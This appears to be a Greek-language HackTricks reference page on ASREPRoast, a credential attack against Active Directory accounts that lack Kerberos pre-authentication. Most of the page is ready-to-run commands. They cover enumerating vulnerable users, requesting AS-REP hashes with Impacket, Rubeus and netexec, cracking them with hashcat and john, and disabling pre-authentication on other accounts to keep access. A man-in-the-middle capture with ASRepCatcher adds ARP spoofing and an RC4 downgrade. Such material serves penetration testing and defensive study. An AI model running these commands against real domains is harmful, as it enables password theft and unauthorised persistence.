# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

Το ASREPRoast είναι μια επίθεση ασφαλείας που εκμεταλλεύεται χρήστες που δεν έχουν το **Kerberos pre-authentication required attribute**. Στην ουσία, αυτή η ευπάθεια επιτρέπει σε επιτιθέμενους να ζητήσουν αυθεντικοποίηση για έναν χρήστη από τον Domain Controller (DC) χωρίς να χρειάζεται ο κωδικός του χρήστη. Ο DC απαντά με ένα μήνυμα κρυπτογραφημένο με το κλειδί που προέρχεται από τον κωδικό του χρήστη, το οποίο οι επιτιθέμενοι μπορούν να προσπαθήσουν να σπάσουν offline για να ανακαλύψουν τον κωδικό του χρήστη.

Οι κύριες προϋποθέσεις γι' αυτή την επίθεση είναι:

- **Lack of Kerberos pre-authentication**: Οι στοχευόμενοι χρήστες δεν πρέπει να έχουν ενεργοποιημένη αυτή τη λειτουργία ασφαλείας.
- **Connection to the Domain Controller (DC)**: Οι επιτιθέμενοι χρειάζονται πρόσβαση στον DC για να στέλνουν αιτήματα και να λαμβάνουν κρυπτογραφημένα μηνύματα.
- **Optional domain account**: Η κατοχή ενός domain account επιτρέπει στους επιτιθέμενους να εντοπίζουν πιο αποτελεσματικά ευάλωτους χρήστες μέσω LDAP queries. Χωρίς τέτοιο account, οι επιτιθέμενοι πρέπει να μαντέψουν ονόματα χρηστών.

#### Εντοπισμός ευάλωτων χρηστών (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Αίτηση μηνύματος AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus θα δημιουργήσει ένα 4768 με encryption type 0x17 και preauth type of 0.

#### Σύντομες εντολές (Linux)

- Εντοπίστε πρώτα πιθανούς στόχους (π.χ. από leaked build paths) με Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Ανάκτηση του AS-REP ενός μεμονωμένου χρήστη ακόμα και με **κενό** κωδικό χρησιμοποιώντας `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (το netexec επίσης εμφανίζει LDAP signing/channel binding posture).
- Crack with `hashcat out.asreproast /path/rockyou.txt` – ανιχνεύει αυτόματα **-m 18200** (etype 23) για AS-REP roast hashes.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Διατήρηση πρόσβασης

Καταστήστε το **preauth** μη απαιτούμενο για έναν χρήστη για τον οποίο έχετε δικαιώματα **GenericAll** (ή δικαιώματα εγγραφής ιδιοτήτων):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast χωρίς διαπιστευτήρια

Ένας επιτιθέμενος μπορεί να χρησιμοποιήσει μια θέση man-in-the-middle για να υποκλέψει πακέτα AS-REP καθώς διασχίζουν το δίκτυο χωρίς να χρειάζεται το Kerberos pre-authentication να είναι απενεργοποιημένο. Επομένως λειτουργεί για όλους τους χρήστες στο VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) μας επιτρέπει να το κάνουμε. Επιπλέον, το εργαλείο αναγκάζει τους σταθμούς εργασίας των πελατών να χρησιμοποιήσουν RC4 τροποποιώντας τη διαπραγμάτευση Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Αναφορές

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
